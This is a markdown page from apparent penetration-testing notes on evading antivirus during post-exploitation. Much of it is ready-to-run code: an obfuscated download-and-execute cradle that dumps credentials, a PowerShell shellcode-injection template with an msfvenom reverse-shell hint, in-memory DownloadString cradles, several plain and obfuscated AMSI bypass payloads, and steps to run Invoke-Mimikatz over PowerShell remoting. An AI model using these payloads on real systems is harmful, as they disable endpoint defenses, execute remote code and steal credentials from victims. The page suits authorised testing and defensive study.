---
title: AV Evasion
category: Post Exploitation
order: 1
---

Antivirus or AV is a kind of software used to prevent, scan, detect and delete malware from a computer. During our assessments there are a lot of tools such as meterpreter, mimikatz, etc that are flagged as a malware.

So in order to perform our work properly we need to bypass the AV.

Some interesting websites or programs that will help us to determine if our binary/script is flagged as a malware:

* [https://antiscan.me/](antiscan.me)
* [https://github.com/RythmStick/AMSITrigger](AMSITrigger)
* [https://github.com/matterpreter/DefenderCheck](DefenderCheck)

# String Replacement

String Replacement is one of the oldest techniques. Antivirus makes use of signatures, if we replace the name of:

* variables
* functions
* more over

We can modify the signatures in order to bypass the AV. Read more:

* [https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/)
* [https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/](https://s3cur3th1ssh1t.github.io/Customizing_C2_Frameworks/)


# Obfuscation

Obfuscate is the action of amking something obscure, unclear or unintelligible.

## Invoke-Obfuscation

Invoke-Obfuscation is a PowerShell v2.0+ compatible PowerShell command and script obfuscator.

* [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

![Invoke-Obfuscation](/hackingnotes/images/invoke-obfuscation.png)

```
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation

set SCRIPTBLOCK "iex (New-Object System.Net.Webclient).DownloadString('http://localhost/script.ps1);Invoke-Kapokatz.ps1 -DumpCreds"

ENCODING

5

Result:
inVoKe-EXPRESSiOn ( ([rUNTiME.iNteRopsERViCEs.marshAl]::ptRTosTriNGaUto( [RuNtIMe.InteRopSErviCEs.marshaL]::seCuREsTrinGtobsTr($('76492d1116743f0423413b16050a5345MgB8AC8AagB1AEwAbQBnAGEAcgBSAE0AUQBSADYAWQA1AHIAeQBPAHEATwBQAEEAPQA9AHwAOABlAGUAYQBmAGUAZQBjAGYAOAA5AGEAMAAxADMAYQA1ADcAMQA3AGYAZgA0ADQAMQA3AGIAMAA1ADAANwBjAGUAMwBiAGQANAAwAGYAMQAyADQANQBkAGEAZABmADcANAAwADgAYgBjAGMANAA3AGYAMQA1ADAANgBjADAANgBmADEAYwA4ADEANABlAGEANQA4ADAANABkADgAYwA4ADIAOAA3AGMAMABkAGMAYwBlAGEAYwA3AGQAMwA4ADcAMAAzADQAYgA2AGQAOAA0ADYAYQAwADIAZABiADQAYQA1ADEAZgBlAGMANgBmAGYAOAA4ADMAMABlAGQAMwA1AGIAZAA1AGEAMwA4ADkAYgAyADAANgAyAGEAYQAzADcAMQBhADUAYQBmAGQAOAAwADcAOQA0AGUAZgA1ADYANQA3AGQAZgAzADIAMgBhAGUAMAA2ADAAYgAxADgAYwBhAGUAYwBjAGUAMABlADMAZABkADYAMAAxADYAZQA0ADcANABiADAAZgA4ADEAYQA0AGEAZgA5ADQANAAwADcAOQBlADkAMgAyADcAZgBiAGEAZQBkADkAMAA0AGUAOQA3ADEAMwAwAGIANgAzADgANwBmADgANQAzAGQANQBiAGEANwBmAGMANQAzAGIAYwBlADYAOABlADgANwA2ADcAZQA0AGYANQBiADMAMwBkAGIAOQA1ADQAMgA5ADYAOAA5ADgANgBmADEANgAxADIAMwBjAGMAOABhADAAZQAwADEAOABlAGUAMAA5ADEAMgBjAG')))))
```

# In-Memory Injection

## Template

A basic template script that performs in-memory injection:

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
# msfvenom -p windows/shell_reverse_tcp LHOST=<ip_addr> LPORT=<port> -f powershell
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

## Powershell

We can download and execute a script without saving it on disk. This is a powerful tool because we prevent the antivirus from scanning our file.

```powershell
iex (New-Object System.Net.Webclient).DownloadString('http://ip-addr:port/file.ps1')
iex (iwr 'http://ip-addr:port/file.ps1')
```

Since this technique was appear, windows implemented the `AMSI (Antimalware Scan Interface)` as a method to defend from malware during execution. So we need to bypass it.

# AMSI bypass

Microsoft has developed AMSI (Antimalware Scan Interface) as a method to defend against common malware execution and protect the end user. By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution to prevent arbitrary execution of code.

When a user executes a script or initiates PowerShell, the `AMSI.dll` is injected into the process memory space. These two API's are used by the AV to scan the buffer and strings searching signatures from malware.

```
AmsiScanBuffer()
AmsiScanString()
```

If a known signature is identified during execution does not initate and a message appears that the script has been blocked during execution by the antivirus.

![AMSI](/hackingnotes/images/amsi.png)

Even though some of the techniques in their original state are blocked, modification of strings, variables and functions, encoding and obfuscation could revive even the oldest tactics.

## PowerShell Downgrade

Even though that Windows PowerShell 2.0 is deprecated, in some devices it hasn't been removed. Older versions of PowerShell does not contain security controls such as AMSI.

```powershell
powershell -version 2
```

## Set "amsiInitFailed" flag

Setting the `amsiInitFailed` flag prevents the AMSI scanning capability for the current process:

* Original Payload:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

* Base64 Encoded Payload:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```











AMSI bypass method to execute powershell scripts such as `Invoke-Mimikatz.ps1` with `PowerShell Remote`.

First we need to create a session on the target machine.

```powershell
$sess = New-PSSession -ComputerName srv01.corp.local
Enter-PSSession -Session $sess
```
Execute the following payload and exit the session.

```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
Other payload:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

Import the script remotely with `PowerShell Remote`:

```powershell
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
```
Enter in the session again and execute the malicious script.

```powershell
Enter-PSSession -Session $sess
Invoke-Mimikatz -Command '"sekurlsa::tickets'
```

> **Note**: More bypasses are available on the following resource:
>
> https://gist.github.com/reigningshells/a255fcca07465befbcbf4be9cdf67560



https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/

# Other Tools

## Shellter

Another way to bypass AV is using Shellter

![Shellter](/hackingnotes/images/shellter.png)




